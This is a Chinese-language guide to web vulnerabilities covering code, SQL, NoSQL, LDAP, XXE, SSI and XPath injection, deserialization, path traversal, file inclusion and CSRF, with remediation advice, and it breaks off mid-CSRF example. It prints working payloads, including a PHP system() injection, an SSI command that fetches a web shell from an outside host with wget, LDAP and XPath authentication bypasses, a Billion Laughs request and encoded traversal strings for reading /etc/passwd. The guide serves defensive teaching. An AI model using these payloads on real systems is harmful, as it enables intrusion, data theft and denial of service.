成功执行代码注入攻击都可能导致数据完整性丧失、机密性丧失，因为注入的代码数据始终与数据调用或写入有关。此外，代码注入通常可以导致执行任意代码。 成功执行代码注入可以绕过身份验证。 攻击案例 场景1：当开发人员使用PHP eval()函数并向其传递攻击者可以修改的不受信任的数据时，可能会注入代码。 ​ 下面的示例显示了使用eval()函数的危险方式：1$myvar = "varname"; $x = $_GET['arg']; eval("\$myvar = \$x;"); ​ 由于没有输入验证，因此上面的代码容易受到代码注入攻击。 ​ 例如：1/index.php?arg=1; phpinfo() ​ 在利用此类错误时，攻击者可能想要执行系统命令。在这种情况下，代码注入错误也可以用于命令注入，例如：1/index.php?arg=1; system('id') 检测方法 测试PHP注入漏洞 使用查询字符串，测试人员可以注入要处理的代码（在此示例中为恶意URL），作为所包含文件的一部分： 1http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a 恶意URL被接受为PHP页面的参数，该页面稍后将使用包含文件中的值。 修复建议 验证和清除输入：扫描转义字符应用程序语言和操作系统的其他特殊符号，例如注释标记，行终止字符和命令定界符。如果应用程序只希望使用一组有限的值，请仅接受这些值，例如通过将其列入白名单或有条件地将其放行。 避免使用脆弱的评估构造：尽可能避免在原始用户输入上使用eval()和等效函数。使用特定于语言的专用功能来安全处理用户提供的参数。 将所有输入数据视为不可信：请注意用户可以为应用程序提供或处理数据的所有位置。除了查询字符串和HTML表单之类的明显注入向量之外，还可以通过特制数据文件，手动修改的cookie和其他方法注入代码。 限制解释器：如果您可以控制服务器配置，则可能需要将解释器功能限制为应用程序所需的最低限度，以防止升级为系统命令注入。例如，如果PHP应用程序不使用system()函数，则可以通过在disable_functions指令中对其进行指定来在php.ini文件中禁用该函数。通常禁用的PHP函数包括：exec()，passthru()，shell_exec()，system()，proc_open()，popen()，curl_exec()，curl_multi_exec()，parse_ini_file()和show_source()。 检查代码：使用静态代码检查工具扫描与输入验证和不安全评估有关的漏洞。 扫描应用程序：使用动态Web漏洞扫描程序以确保应用程序不受各种类型的攻击（包括代码注入）的影响。 SQL注入漏洞描述 通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 导致敏感信息泄漏、破坏数据库内容和结构、甚至利用数据库本身的扩展功能控制服务器操作系统。 漏洞危害 攻击者利用SQL注入漏洞，可以获取数据库中的多种信息(例如：管理员后台密码)，从而脱取数据库中内容(脱库)。在特别情况下，还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取Webshell或者服务器系统权限。 攻击案例 场景1：应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据： 1String query = &quot;SELECT * FROM accounts WHERE custID=&apos;&quot; + request.getParameter(&quot;id&quot;) + &quot;&apos;“; 场景2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：Hibernate查询语言（HQL））：1Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'"); ​ 在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’ ​ or’1’=’1。例如：http://example.com/app/accountView?id=&#39; or &#39;1&#39;=&#39;1这样查询语句的意义就变成了从accounts表中返回所有的记录。更危险的攻击可能 导致数据被篡改甚至是存储过程被调用。 检测方法 提交单引号字符&#39;并查找错误或其他异常。 提交一些特定于SQL的语法，以评估入口点的基础（原始）值和其他值，并在所得应用程序响应中寻找系统差异。 提交布尔条件，例如OR 1=1并OR 1=2, and在应用程序的响应中寻找差异。 提交旨在在SQL查询中执行时触发时间延迟的有效负载，并寻找响应时间的差异。 提交旨在在SQL查询中执行时触发带外网络交互的OAST有效负载，并监视所有结果交互。 修复建议 代码层最佳防御SQL注入方案：采用sql语句预编译和绑定变量，是防御sql注入的最佳方法。 （1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。 （2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。 （3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。 （4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。 （5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。 （6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。 （7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。 NoSQL注入漏洞描述 NoSQL数据库调用都写在应用程序的编程语言，一个自定义的API调用，或格式化按照通常的习惯（如XML，JSON，LINQ，等）。针对这些规范的恶意输入可能不会触发主要的应用程序过滤检查。例如，过滤掉常见的HTML特殊字符（例如）“&lt; &gt; &amp; ;”不会阻止针对JSON API的攻击，其中特殊字符包括“/ { } :”。 与传统的SQL注入相比，NoSQL注入攻击可能在应用程序的不同区域中执行。在数据库引擎内执行SQL注入的地方，NoSQL变体可以在应用程序层或数据库层内执行，具体取决于所使用的NoSQL API和数据模型。通常，NoSQL注入攻击将在攻击字符串被解析，评估或连接到NoSQL API调用的地方执行。 漏洞危害 NoSQL注入攻击可以在过程语言中而不是在声明性SQL语言中执行，因此其潜在影响要大于传统SQL注入。 攻击案例 场景1：如果攻击者能够操纵传递给$where运算符的数据，则该攻击者可以包含任意JavaScript，以将其评估为MongoDB查询的一部分。如果用户输入不经过清理就直接传递到MongoDB查询中，则以下代码中暴露了一个示例漏洞。 1db.myCollection.find( &#123; active: true, $where: function() &#123; return obj.credits - obj.debits &lt; $userInput; &#125; &#125; );; ​ 与测试其他类型的注入一样，不需要完全利用此漏洞来证明问题。通过注入与目标API语言相关的特殊字符并观察结果，测试人员可以确定应用程序是否正确清 除了输入。例如，在MongoDB中，如果未经过滤传递包含以下任何特殊字符的字符串，则会触发数据库错误。1' " \ ; &#123; &#125; ​ 使用普通的SQL注入，类似的漏洞将使攻击者可以执行任意SQL命令-随意公开或处理数据。但是，由于JavaScript是一种功能全面的语言，因此，这不仅使攻 击者可以操纵数据，还可以运行任意代码。例如，一个完整的利用漏洞不仅会在测试时引起错误，还可以使用特殊字符来制作有效的JavaScript。 检测方法 MongoDB NoSQL注入常见测试payloads： 12345678910111213141516171819true, $where: '1 == 1', $where: '1 == 1'$where: '1 == 1'', $where: '1 == 11, $where: '1 == 1'&#123; $ne: 1 &#125;', $or: [ &#123;&#125;, &#123; 'a':'a' &#125; ], $comment:'successful MongoDB injection'db.injection.insert(&#123;success:1&#125;);db.injection.insert(&#123;success:1&#125;);return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1|| 1==1' &amp;&amp; this.password.match(/.*/)//+%00' &amp;&amp; this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00&#123;$gt: ''&#125;[$ne]=1';sleep(5000);';it=new%20Date();do&#123;pt=new%20Date();&#125;while(pt-it&lt;5000); 在MongoDB中测试NoSQL注入漏洞 MongoDB API需要BSON（二进制JSON）调用，并包括一个安全的BSON查询组装工具。但是，根据MongoDB文档，在几个替代查询参数中允许未序列化的JSON和JavaScript表达式。允许任意JavaScript输入的最常用的API调用是$where运算符。 由于$where在SQL中，MongoDB运算符通常用作简单的过滤或检查。 1db.myCollection.find( &#123; $where: "this.credits == this.debits" &#125; ); 修复建议 为了避免NoSQL注入，必须始终将用户输入视为不受信任。可以执行以下操作来验证用户输入： 使用输入过滤库，例如mongo-sanitize或mongoose。 如果找不到适合开发环境的库，请将用户输入转换为期望的类型。例如，将用户名和密码转换为字符串。 在MongoDB的情况下，切勿在用户输入中使用where，mapReduce或group运算符，因为这些运算符使攻击者能够注入JavaScript，因此比其他运算符更加危险。 为了加强安全性，可以将mongod.conf的javascriptEnabled设置为false。 以最低的权限运行应用程序，以便即使被利用，攻击者也无法访问其他资源。 LDAP注入漏洞描述 LDAP（轻型目录访问协议）注入是一种攻击，用于利用基于Web的应用程序构建基于用户输入的LDAP语句。当应用程序无法正确清理用户输入时，可以使用本地代理修改LDAP语句。这可能导致执行任意命令，例如向未经授权的查询授予权限以及LDAP树中的内容修改。SQL注入中可用的相同高级利用技术可以类似地应用于LDAP注入中。 漏洞危害 攻击者可以更改LDAP查询的输入，该输入允许执行未授权的代码或命令，允许读取或修改敏感数据或导致其他意外行为。 攻击案例 场景1：以下代码使用用户输入地址数据构造LDAP查询：由于代码无法中和用于构造查询的地址字符串，因此攻击者可以提供包含其他LDAP查询的地址。1234Example Language: Java context = new InitialDirContext(env);String searchFilter = &quot;StreetAddress=&quot; + address;NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls); 检测方法 场景1：搜索过滤器 ​ 假设我们一个Web应用的搜索过滤器，如下所示：1searchfilter="(cn="+user+")" ​ 可以通过HTTP请求实例化：1http://www.example.com/ldapsearch?user=John ​ 如果将值John替换为*，则通过发送请求：1http://www.example.com/ldapsearch?user=* ​ 过滤器如下所示：1searchfilter="(cn=*)" ​ 匹配具有“cn”属性的每个对象等于任何内容。 ​ 如果应用程序容易受到LDAP注入的攻击，它将显示部分或全部用户属性，具体取决于应用程序的执行流程和LDAP连接的用户的权限。 ​ 测试人员可以使用试错方法，通过在参数插入“(|&amp;*”和其他字符，以检查错误的应用程序。 场景2：登录 ​ 如果Web应用程序在登录过程中使用LDAP来检查用户凭据，并且容易受到LDAP注入的影响，则可以通过注入始终为真的LDAP查询（以类似于SQL和XPATH注入的方式）来绕过身份验证检查。 ​ 假设Web应用程序使用过滤器来匹配LDAP用户/密码对。1searchlogin= "(&amp;(uid="+user+")(userPassword=&#123;MD5&#125;"+base64(pack("H*",md5(pass)))+"))"; ​ 通过使用以下值：12user=*)(uid=*))(|(uid=*pass=password ​ 搜索过滤器将导致：1searchlogin="(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=&#123;MD5&#125;X03MO1qnZdYdgyfeuILPmQ==))"; ​ 这是正确的，而且永远都是正确的。这样，测试人员将以LDAP树中的第一个用户身份获得登录状态。 修复建议 防止LDAP注入的最佳方法是使用必要的验证方案，以确保进入查询的数据不包含任何攻击。但是，在某些情况下，有必要在传递给LDAP查询的输入中包含特殊字符。在这种情况下，使用转义可以防止LDAP解释器认为那些特殊字符实际上是LDAP查询的一部分。 在LDAP的目录结构的DN（Distinguished Name）中需要使用“\”转义的特殊字符 123456789101112&amp;!|=&lt;&gt;,+-"'; 需要使用{\ASCII}转义的特殊字符 123456( &#123;\28&#125;) &#123;\29&#125;\ &#123;\5c&#125;* &#123;\2a&#125;/ &#123;\2f&#125;NUL &#123;\0&#125; XML外部实体注入（XXE）漏洞描述 XML外部实体攻击是针对应用程序解析XML输入类型的攻击。当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 漏洞危害 泄露机密数据。 拒绝服务。 伪造服务器端请求（SSRF）。 参数实体，读取任意文件。 通过Xinclude 包含外部资源。 进行内网端口扫描探测。 攻击案例 场景1：Billion Laughs 攻击，此攻击会使XML解析器的内存过载，从而造成目标拒绝服务： 请求包 123456789101112POST http://example.com/xml HTTP/1.1&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt; &lt;!ENTITY bar "World "&gt; &lt;!ENTITY t1 "&amp;bar;&amp;bar;"&gt; &lt;!ENTITY t2 "&amp;t1;&amp;t1;&amp;t1;&amp;t1;"&gt; &lt;!ENTITY t3 "&amp;t2;&amp;t2;&amp;t2;&amp;t2;&amp;t2;"&gt;]&gt;&lt;foo&gt; Hello &amp;t3;&lt;/foo&gt; 响应包 123HTTP/1.0 200 OK Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World 检测方法 源代码审计： 如果以下Java API配置不正确，则目标系统可能容易受到XXE的攻击。 12345678910111213141516171819javax.xml.parsers.DocumentBuilderjavax.xml.parsers.DocumentBuildFactoryorg.xml.sax.EntityResolverorg.dom4j.*javax.xml.parsers.SAXParserjavax.xml.parsers.SAXParserFactoryTransformerFactorySAXReaderDocumentHelperSAXBuilderSAXParserFactoryXMLReaderFactoryXMLInputFactorySchemaFactoryDocumentBuilderFactoryImplSAXTransformerFactoryDocumentBuilderFactoryImplXMLReaderXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser 检查源代码是否将docType，外部DTD和外部参数实体设置为禁止使用。 C语言xml解析库源代码检查关键字： 12libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile,xmlReadIO,xmlReadMemory,xmlCtxtReadDoc,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIOlibxerces-c: XercesDOMParser,SAXParser,SAX2XMLReader 使用wfuzz工具：https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt 修复建议 防止XXE的最安全方法始终是完全禁用DTD（外部实体）。 使用开发语言提供的禁用外部实体的方法： 12345678910PHPlibxml_disable_entity_loader(true);JAVADocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 SSI注入漏洞描述 SSI是Web应用程序上存在的指令，用于向HTML页面提供动态内容。它们与CGI相似，除了SSI用于在加载当前页面之前或在可视化页面时执行某些操作。为此，Web服务器在将页面提供给用户之前先分析SSI。 服务器端包含攻击允许通过在HTML页面中注入脚本或远程执行任意代码来利用Web应用程序。可以通过操纵应用程序中使用的SSI来利用它，也可以通过用户输入字段来强制使用它。 漏洞危害 攻击者可以访问敏感信息，例如密码文件，并执行未经授权的代码或命令。SSI伪指令注入到输入字段中，并将它们发送到Web服务器。Web服务器在提供页面之前会解析并执行指令。然后，下次为用户的浏览器加载页面时，攻击结果将可见。 攻击案例 场景1：根据所使用的服务器操作系统，用于注入SSI的命令会有所不同。以下命令代表应用于执行OS命令的语法。 ​ Linux： 12345678列出目录文件：&lt;!--#exec cmd="ls" --&gt;访问目录：&lt;!--#exec cmd="cd /root/dir/"&gt;访问目录：&lt;!--#exec cmd="cd /root/dir/"&gt;执行脚本：&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt; ​ Windows： 1234列出目录文件：&lt;!--#exec cmd="dir" --&gt;访问目录：&lt;!--#exec cmd="cd C:\admin\dir"&gt; 场景2： ​ 可用于访问和设置服务器信息的其他SSI示例： 12345678910要更改错误消息输出：&lt;!--#config errmsg="File not found, informs users and password"--&gt;要显示当前文档的文件名：&lt;!--#echo var="DOCUMENT_NAME" --&gt;要显示虚拟路径和文件名：&lt;!--#echo var="DOCUMENT_URI" --&gt;使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式：&lt;!--#config timefmt="A %B %d %Y %r"--&gt;使用“ fsize”命令，可以打印所选文件的大小：&lt;!--#fsize file="ssi.shtml" --&gt; 检测方法 前提条件： 支持服务器端的Web服务器包括并启用了它们，用户可控制的输入，可以包含Web服务器的包含指令。 查找流行的页面文件名。攻击者将在URL中寻找.shtml，.shtm，.asp，.aspx和其他知名字符串，以帮助确定是否启用了SSI功能。 提取.htaccess文件。在Apache Web服务器安装中，.htaccess文件可以在特定位置启用服务器端包含。在这些情况下，.htaccess文件位于启用SSI的目录中，并且从理论上讲可以从Web服务器获取。尽管大多数Web服务器都拒绝获取.htaccess文件，但配置错误的服务器将允许它。 使用代理工具来跟踪和记录所有链接。特别注意URL中包含参数的任何链接。 使用代理工具记录在手动遍历Web应用程序期间访问的所有链接。特别注意URL中包含参数的任何链接。经常需要使用这种类型的手动遍历来识别属于GET方法形式而不是POST形式的形式。 常见测试代码： 12345678&lt;!--#echo var="DATE_LOCAL" --&gt;打印当前时间。&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;包括CGI脚本的输出。&lt;!--#include virtual="/footer.html" --&gt;在目录中包含文件或列表文件的内容。&lt;!--#exec cmd="ls" --&gt;包括系统命令的输出。 找到潜在的注入点列表后，我们可以检查输入是否正确验证，然后找出所提供输入的存储位置。我们需要确保可以注入SSI指令中使用的字符： 1&lt; ! # = / . " - &gt; and [a-zA-Z0-9] 为了测试验证是否足够，我们可以以输入形式输入例如以下字符串： 1&lt;!--#include virtual="/etc/passwd" --&gt; 如果Web应用程序将使用该数据来构建动态生成的页面，则也可以在HTTP标头中执行注入： 123GET / HTTP/1.0Referer: &lt;!--#exec cmd="/bin/ps ax"--&gt;User-Agent: &lt;!--#include virtual="/proc/version"--&gt; 修复建议 在全局access.conf文件或本地.htaccess（Apache）文件中设置OPTIONS IncludesNOEXEC，以拒绝不需要它们的目录中的SSI执行。 必须对所有用户可控制的输入进行适当的过滤。这包括省略或编码某些可能被解释为SSI指令一部分的字符或字符串。 非必要情况下关闭“服务端包含”。 XPATH注入漏洞描述 XPath是一种主要为解决XML文档的某些部分而设计和开发的语言。XPath注入与SQL注入类似，当网站使用用户提供的信息为XML数据构造XPath查询时，就会发生XPath注入攻击。通过将故意格式错误的信息发送到网站，攻击者可以了解XML数据的结构，或访问他们通常无法访问的数据。 XML的查询是通过XPath完成的，XPath是一种简单的描述性语句，它允许XML查询找到一条信息。与SQL一样，您可以指定要查找的某些属性以及要匹配的模式。在网站上使用XML时，通常会接受查询字符串的某种形式的输入，以标识要定位并显示在页面上的内容。 漏洞危害 如果将XML数据用于身份验证（例如，基于XML的用户文件），他们甚至可以在网站上提升特权。 成功利用此漏洞后，攻击者可能会未经适当的授权就绕过身份验证机制或访问信息。 攻击案例 场景1：我们将使用此XML代码段作为示例 1234567891011121314151617&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;Employees&gt; &lt;Employee ID="1"&gt; &lt;FirstName&gt;Arnold&lt;/FirstName&gt; &lt;LastName&gt;Baker&lt;/LastName&gt; &lt;UserName&gt;ABaker&lt;/UserName&gt; &lt;Password&gt;SoSecret&lt;/Password&gt; &lt;Type&gt;Admin&lt;/Type&gt; &lt;/Employee&gt; &lt;Employee ID="2"&gt; &lt;FirstName&gt;Peter&lt;/FirstName&gt; &lt;LastName&gt;Pan&lt;/LastName&gt; &lt;UserName&gt;PPan&lt;/UserName&gt; &lt;Password&gt;NotTelling&lt;/Password&gt; &lt;Type&gt;User&lt;/Type&gt; &lt;/Employee&gt;&lt;/Employees&gt; ​ 假设我们在网页上有一个用户身份验证系统，该系统使用这种数据文件来登录用户。提供用户名和密码后，该软件可能会使用XPath查找用户： 123456789VB:Dim FindUserXPath as StringFindUserXPath = "//Employee[UserName/text()='" &amp; Request("Username") &amp; "' And Password/text()='" &amp; Request("Password") &amp; "']"C#:String FindUserXPath;FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And Password/text()='" + Request("Password") + "']"; ​ 使用普通的用户名和密码，此XPath可以工作，但是攻击者可能发送错误的用户名和密码，并在不知道用户名或密码的情况下选择了XML节点，如下所示： 1234567Username: blah' or 1=1 or 'a'='aPassword: blahFindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 'a'='a' And Password/text()='blah']Logically this is equivalent to: //Employee[(UserName/text()='blah' or 1=1) or ('a'='a' And Password/text()='blah')] ​ 在这种情况下，仅XPath的第一部分需要为真。密码部分变得无关紧要，并且由于“ 1 = 1”部分，用户名部分将与所有员工匹配。 检测方法 在XPath注入测试中，我们测试是否可以将XPath语法注入到应用程序解释的请求中，从而允许攻击者执行用户控制的XPath查询。 假设我们的数据库由以下XML文件表示： 123456789101112131415161718&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;gandalf&lt;/username&gt; &lt;password&gt;!c3&lt;/password&gt; &lt;account&gt;admin&lt;/account&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;Stefan0&lt;/username&gt; &lt;password&gt;w1s3c&lt;/password&gt; &lt;account&gt;guest&lt;/account&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password&gt;Un6R34kb!e&lt;/password&gt; &lt;account&gt;guest&lt;/account&gt; &lt;/user&gt;&lt;/users&gt; 一个返回用户名gandalf和密码为的帐户的XPath查询!c3如下： 1string(//user[username/text()='gandalf' and password/text()='!c3']/account/text()) 如果应用程序未正确过滤用户输入，则测试人员将能够注入XPath代码并干扰查询结果。例如，测试人员可以输入以下值： 1Username: ' or '1' = '1 Password: ' or '1' = '1 使用这些参数，查询将变为： 1string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) 与常见的SQL注入攻击一样，我们创建了一个始终为true的查询，这意味着即使未提供用户名或密码，应用程序也将对用户进行身份验证。与使用XPath注入的常见SQL注入攻击一样，第一步是在要测试的字段中插入&#39;(单引号)，在查询中引入语法错误，并检查应用程序是否返回错误消息。 修复建议 就像避免SQL注入的技术一样，需要使用参数化的XPath接口，或者转义用户输入以使其可以安全地包含在动态构造的查询中。如果使用引号终止动态构造的XPath查询中的不可信输入，则需要在不可信输入中转义该引号，以确保不可信数据不能尝试脱离该引用上下文。在以下示例中，单引号（&#39;）用于终止Username和Password参数。因此，我们需要用该字符的XML编码版本（即“&#39;”）替换此输入中的所有&#39;字符。 使用预编译的XPATH查询，预编译的XPath查询是在程序执行前已经预设。 反序列化漏洞描述 序列化和反序列化是指以下过程：获取程序内部与对象相关的数据，将其打包以允许将数据从外部存储或传输（“序列化”），然后提取序列化的数据以重建原始对象（“反序列化”）。 序列化是将某些对象转换为可以稍后恢复的数据格式的过程。人们经常序列化对象，以将其保存到存储中或作为通信的一部分进行发送。 反序列化是该过程的逆过程，它采用某种格式构造数据，然后将其重建为对象。如今，用于序列化数据的最流行的数据格式是JSON。在此之前，它是XML。 漏洞危害 反序列化可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。 攻击案例 ······ 检测方法 黑盒测试： 搜索以下以下列开头的base64编码的内容： 1AAEAAAD///// 搜索带有以下文本的内容： 12TypeObject$type: 白盒测试： 在源代码中搜索以下术语： 12TypeNameHandlingJavaScriptTypeResolver 修复建议 不允许数据流定义将反序列化到的对象的类型。可以通过使用DataContractSerializer或XmlSerializer尽可能避免这种情况。 使用替代数据格式：通过避免本机（反）序列化格式，可以大大降低风险。通过切换为JSON或XML之类的纯数据格式，可以减少自定义反序列化逻辑重新用于恶意目的的机会。 仅反序列化签名数据：如果应用程序在反序列化之前知道需要处理哪些消息，则可以在序列化过程中对它们进行签名。然后，应用程序可以选择不对没有身份验证签名的任何消息进行反序列化。 目录遍历漏洞描述 由于Web服务器或者Web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使Web根目录以外的文件），甚至执行系统命令。 程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。 漏洞危害 攻击者可能能够创建，覆盖，删除或破坏，用于执行代码的关键文件，例如程序或库。 如果目标文件用于安全机制，则攻击者可能能够绕过该机制。例如，在密码文件末尾附加新帐户可能使攻击者可以绕过身份验证。 攻击者可能能够读取意外文件的内容并暴露敏感数据。如果目标文件用于安全机制，则攻击者可能能够绕过该机制。例如，通过读取密码文件，攻击者可以进行暴力破解密码猜测攻击，以便获取目标系统帐户权限。 可能会完全阻止目标运行，并且在使用诸如身份验证之类的保护机制的情况下，它可能会锁定目标的每个用户。 攻击者可能使用目录遍历来下载服务器配置文件，其中包含敏感信息并可能暴露更多服务器漏洞。最终，攻击者可以访问机密信息，甚至可以完全控制服务器。 攻击案例 场景1：以下是perl语言的目录遍历代码示例，其中每个用户的个人资料信息都存储在单独的文件中，并且所有文件都存储在一个目录中。 123456789my $dataPath = "/users/root/profiles";my $username = param("user");my $profilePath = $dataPath . "/" . $username;open(my $fh, "&lt;$profilePath") || ExitError("profile read error: $profilePath");print "&lt;ul&gt;\n";while (&lt;$fh&gt;) &#123;print "&lt;li&gt;$_&lt;/li&gt;\n";&#125;print "&lt;/ul&gt;\n"; ​ 攻击者可以构造以下payload进行攻击，打开文件后，操作系统会在路径规范化期间解析“../”，并真实访问此文件：“/etc/passwd”，攻击者可以读取密码文件的内容。 1/users/root/profiles/../../../etc/passwd 检测方法 攻击者通过访问根目录，发送一系列“../”字符来遍历高层目录，可以执行系统命令，甚至使系统崩溃，并且尝试找到系统的配置文件或者系统中存在的敏感文件。 也可通过判断网站语言，并根据其url中部分提供的参数，进行构造相关的路径信息，如收集到网站中间件版本为apache，则想办法构造../../../Web-INF/Web.xml等，然后查看其是否可被下载出来。随后可构造下载系统文件。 编码或者多重编码绕过： 1234567891011编码或多重编码 | 明码内容 %2e%2e%2f | ../ %2e%2e/ | ../ ..%2f | ../ %2e%2e%5c | ..\ %2e%2e\ | ..\ ..%5c | ..\ %252e%252e%255c | ..\ ..%255c | ..\ ..%c0%af | ../ ..%c1%9c | ..\ 修复建议 防止文件路径遍历漏洞的最有效方法是避免将用户提供的输入完全传递给文件系统API。 需对用户提交的内容进行严格的过滤，主要指过滤目录跳转符“../”，字符截断符，dir命令等。 严格控制Web根目录的权限。 文件包含漏洞描述 文件包含是指程序代码在处理包含文件的时候没有严格控制。主要包括本地文件包含和远程文件包含两种形式，由于开发人员编写源码，开放着将可重复使用的代码插入到单个的文件中，并在需要的时候将它们包含在特殊的功能代码文件中，然后包含文件中的代码会被解释执行。由于并没有针对代码中存在文件包含的函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端解释执行。文件包含攻击中Web服务器源码里可能存在inlcude()此类文件包含操作函数，可以通过客户端构造提交文件路径，是该漏洞攻击成功的最主要原因。 漏洞危害 文件包含漏洞会导致用户可以构造参数包含远程代码在服务器上执行，并得到网站配置或者敏感文件，进而获取到服务器权限，造成网站被恶意删除，用户和交易数据被篡改等一系列恶性后果。 即使没有上载和执行代码的能力，本地文件包含漏洞也可能很危险。攻击者仍然可以使用LFI漏洞执行目录遍历/路径遍历攻击。 攻击案例 场景1：以下是php存在文件包含的问题代码，通过使用提供的’module_name‘参数并将字符串’/function.php‘附加到’module_name‘之后，可以构建文件的路径。通过对 ‘module_name’参数进行构造’?module_name=abc/function.php’，如果’function.php’内容是’ system($_GET[&#39;cmd&#39;]);’，则攻击者可以构造恶意payload ‘ ?module_name=abc&amp;cmd=/etc/passwd’，来读取目标服务器的敏感文件。 12$dir = $_GET['module_name'];include($dir . "/function.php"); 检测方法 通过代码审计的方式检查代码里出现include或require的代码段； 典型的概念验证是加载passwd文件： 1http://vulnerable_host/preview.php?file=../../../../etc/passwd 如果成功执行则会回显以下内容： 123456root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinalex:x:500:500:alex:/home/alex:/bin/bashmargo:x:501:501::/home/margo:/bin/bash... 修复建议 为避免本地文件包含（LFI）和远程文件包含（RFI），保证用户输入不可信。如果需要在网站或Web应用程序代码中包含本地文件，请使用允许的文件名和位置的白名单。使用文件上传功能，确保攻击者无法替换这些文件。 需对用户提交的内容进行严格的过滤，主要指过滤目录跳转符“../”，字符截断符，dir命令等。 严格控制Web根目录的权限。 跨站请求伪造（CSRF）漏洞描述 CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 漏洞危害 获得特权或承担身份；绕过保护机制；读取应用数据；修改申请数据；DoS攻击：使目标崩溃，退出或重新启动。 攻击者可以成功地执行任何操作，决定于受害者的权限。如果受害者是管理员或特权用户，则后果可能包括获得对Web应用程序的完全控制-删除或窃取数据，卸载产品或使用它对产品的所有者发起其他攻击。由于攻击者获取了受害者的权限，因此CSRF的影响范围仅受受害者的特权限制。 攻击案例 场景1： ​ 受害者登录a.com，并保留了登录凭证（Cookie）。 ​ 攻击者引诱受害者访问了b.com。 ​ b.com向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。 ​ a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 ​ a.com以受害者的名义执行了act=xx。 ​ 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。 检测方法 攻击者有理由诱使应用程序中发生某种动作。这可能是特权操作（例如，修改其他用户的权限）或对用户特定数据的任何操作（例如，更改用户自己的密码）。 执行该操作涉及发出一个或多个HTTP请求，并且该应用程序仅依靠会话cookie来标识发出请求的用户。没有其他机制可以跟踪会话或验证用户请求。 执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当使用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到影响。 例如，假设一个应用程序包含一个功能，该功能使用户可以更改其帐户上的电子邮件地址。用户执行此操作时，将发出如下HTTP请求： 1234567POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 30Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfEemail=wiener@normal-user.com 在满足CSRF攻击条件的情况下，攻击者可以构建包含以下HTML的网页： 12345678910&lt;html&gt; &lt;body&gt; &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt; 